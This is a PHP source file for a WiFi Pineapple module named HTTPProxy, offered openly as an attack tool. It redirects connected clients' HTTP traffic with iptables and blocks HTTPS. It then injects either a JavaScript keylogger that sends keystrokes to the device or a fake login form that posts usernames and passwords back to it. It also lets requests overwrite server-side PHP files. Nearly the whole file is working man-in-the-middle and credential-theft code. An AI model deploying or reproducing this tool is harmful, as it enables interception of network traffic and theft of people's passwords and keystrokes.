<?php namespace pineapple;

class HTTPProxy extends Module
{


    // CONSTANTS

    public function route()
    {

        switch ($this->request->action) {

            case 'Start':
            $this->start();
            break;

            case 'Stop':
            $this->stop();
            break;

            case 'save':
            $this->saveHTML($this->request->htmlvalue);
            break;

            case 'getHtml':
            $this->GetHtml();
            break;

            case 'viewResponsePage':
            $this->viewResponsePage();
            break;

            case 'updateResponsePage':
            $this->updateResponsePage($this->request->phpCode);
            break;

            case 'viewLog':
            $this->viewLog();
            break;

            case 'enableKeyLogger':
            $this->enableKeyLogger();
            break;

            case 'disableKeyLogger':
            $this->disableKeyLogger();
            break;

            case 'viewKeyLoggerLog':
            $this->viewKeyLoggerLog();
            break;

            case 'viewHTTPProxyHandler':
            $this->viewHTTPProxyHandler();
            break;

            case 'updateHTTPProxyHandlerPage':
            $this->updateHTTPProxyHandlerPage($this->request->HTTPProxyHandlerCode);
            break;


        }
    }




     public function start(){

        if (!$this->checkProxyRunning()) {

            $running = $this->startHttpProxy();

            if (!$running) {
                $message = "Error starting HTML Injection.";
            }
            else{
            // copy index.php to /www
             $message = "started!";
            exec("cp /pineapple/modules/HTTPProxy/assets/index/index.php  /www/index.php") ;
            exec("cp /pineapple/modules/HTTPProxy/assets/response/responsePage.php  /www/responsePage.php") ;
            exec("cp /pineapple/modules/HTTPProxy/assets/keylogger/keylogger.php  /www/keylogger.php") ;
            exec("cp /pineapple/modules/HTTPProxy/assets/jquery.min.js  /www/jquery.min.js") ;
            }

        }

        else{
         $message="ALready Started";

        }

            $this->response = $message ;
     }

         public function stop(){

             $running = !$this->stopHttpProxy();
            $message = "Stopped HTTPProxy.";
            if (!$running) {
                $message = "Error stopping HTML Injection.";
            }
            else{
            //exec("cp /www/index.php /www/index2.php") ;

             exec("rm  /www/index.php") ;
            exec("rm  /www/responsePage.php") ;
            exec("rm  /www/keylogger.php") ;
            exec("rm  /www/jquery.min.js") ;

            }

         /*   $response_array = array(
                "control_success" => $running,
                "control_message" => $message
            );*/

              $this->response = $message ;

         }


        public function saveHTML($html){

        $htmlFile = fopen("/pineapple/modules/HTTPProxy/assets/HTML/htmlFile.txt", "w") ;
        $out=fwrite($htmlFile, $html);
        fclose($myfile);
        if($out>0){


         $this->response = "Saved!";
        }
        else{
         $this->response = "Error.Not Saved!";
        }

        }



    public function checkProxyRunning()
    {
        return exec("iptables -t nat -L PREROUTING | grep 172.16.42.1") == '' ? false : true;

    }

    public function startHttpProxy()
    {

       // Enable forwarding. It should already be enabled on the pineapple but do it anyways just to be safe
        exec("echo 1 > /proc/sys/net/ipv4/ip_forward");

        // Configure other rules
        exec("iptables -t nat -A PREROUTING -s 172.16.42.0/24 -p tcp --dport 80  -j DNAT --to-destination 172.16.42.1:80");
        exec("iptables -A INPUT -p tcp --dport 53 -j ACCEPT");
        // Drop everything else
        exec("iptables -I INPUT -p tcp --dport 443 -j DROP");

        return $this->checkProxyRunning();

    }



    public function stopHttpProxy()
    {
        exec("iptables -t nat -D PREROUTING -s 172.16.42.0/24 -p tcp --dport 80 -j DNAT --to-destination 172.16.42.1:80");
        exec("iptables -D INPUT -p tcp --dport 53 -j ACCEPT");
        exec("iptables -D INPUT -j DROP");
        return $this->checkProxyRunning();

    }



      public function GetHtml()
    {
        $htmlFile = fopen("/pineapple/modules/HTTPProxy/assets/HTML/htmlFile.txt", "r") ;
        $HTTPProxy=fread($htmlFile,10000);
        $this->response = $HTTPProxy;
      }

     public function viewResponsePage(){

       $phpCode = fopen("/pineapple/modules/HTTPProxy/assets/response/responsePage.php", "r") ;
       $phpCode=fread($phpCode,10000);
       $this->response = $phpCode;

      }

      public function updateResponsePage($phpCode){

       $phpFile = fopen("/pineapple/modules/HTTPProxy/assets/response/responsePage.php", "w") ;
       $out=fwrite($phpFile, $phpCode);
       fclose($phpFile);
        if($out>0){
        $this->response = "Saved!";
        }
        else{
         $this->response = "Error.Not Saved!";
        }


      }

      public function viewLog(){

        $logFile = fopen("/pineapple/modules/HTTPProxy/assets/logFile.txt", "r") ;
        $logFile=fread($logFile,10000);
        if($logFile!=""){
         $this->response = $logFile;
         }
         else{
             $this->response="Empty Logs!";
         }

      }


      public function enableKeyLogger(){


        // javsScript keylogger
        // this code from this github account https://github.com/JohnHoder/Javascript-Keylogger
        $keyLoggerJavaScript="
        <script>
                            var keys='';
                            document.onkeypress = function(e) {
                            	get = window.event?event:e;
                            	key = get.keyCode?get.keyCode:get.charCode;
                            	key = String.fromCharCode(key);
                            	keys+=key;
                            }
                            window.setInterval(function(){
                            	new Image().src = 'http://172.16.42.1/keylogger.php?c='+keys;
                            	keys = '';
                            }, 1000);
        </script>
        ";

        $this->saveHTML($keyLoggerJavaScript);
         $this->response =$keyLoggerJavaScript;

      }

      public function disableKeyLogger(){

              $normalHTML="

        <div style= 'position: fixed; top: 20px; left: 20px;  height: 200px;background:white;color:black'>

        <form>
        Username : <input  type='text'  id='username'>
        Password : <input  type='text'  id='pass'>
        <button>Login</button>
        </form>

        </div>

        <script src='http://172.16.42.1/jquery.min.js'></script>

        <script>

        $('button').click(function(){
            $.ajax({url: 'http://172.16.42.1/responsePage.php?username='+document.getElementById('username').value+'&pass='+document.getElementById('pass').value, success: function(result){

            }});
        });

        </script>
        ";

        $this->saveHTML($normalHTML);
        $this->response =$normalHTML;


}


        public function viewKeyLoggerLog(){

          $logFile = fopen("/pineapple/modules/HTTPProxy/assets/keylogger/dataKeyLogger.txt", "r") ;
          $logFile=fread($logFile,1000);

            if($logFile!=""){
         $this->response = $logFile;
         }
         else{
             $this->response="Empty Logs!";
         }


        }

/*function saveInjectionScope($selectedOption,$specificUrls,$excludeUrls){

        $setting="selectedOption : ".$selectedOption."\n specificUrls : ".$specificUrls."\n excludeUrls : ".$excludeUrls;
    $injectionScopeFile= fopen("/pineapple/modules/HTTPProxy/assets/injectionScope.txt", "w") ;
       $out=fwrite($injectionScopeFile, $setting);
       fclose($injectionScopeFile);
        if($out>0){
        $this->response = "Saved!";
        }
        else{
         $this->response = "Error.Not Saved!";
        }

} */



       public function viewHTTPProxyHandler(){

           $viewHTTPProxyHandlerCode = fopen("/pineapple/modules/HTTPProxy/assets/index/index.php", "r") ;
           $viewHTTPProxyHandlerCode=fread($viewHTTPProxyHandlerCode,10000);
           $this->response = $viewHTTPProxyHandlerCode;
          }



       public function updateHTTPProxyHandlerPage($HTTPProxyHandlerCode){

       $phpFile = fopen("/pineapple/modules/HTTPProxy/assets/index/index.php", "w") ;
       $out=fwrite($phpFile, $HTTPProxyHandlerCode);
       fclose($phpFile);
        if($out>0){
        $this->response = "Saved!";

        exec("cp /pineapple/modules/HTTPProxy/assets/index/index.php  /www/index.php") ;
        }
        else{
         $this->response = "Error.Not Saved!";
        }


      }







}
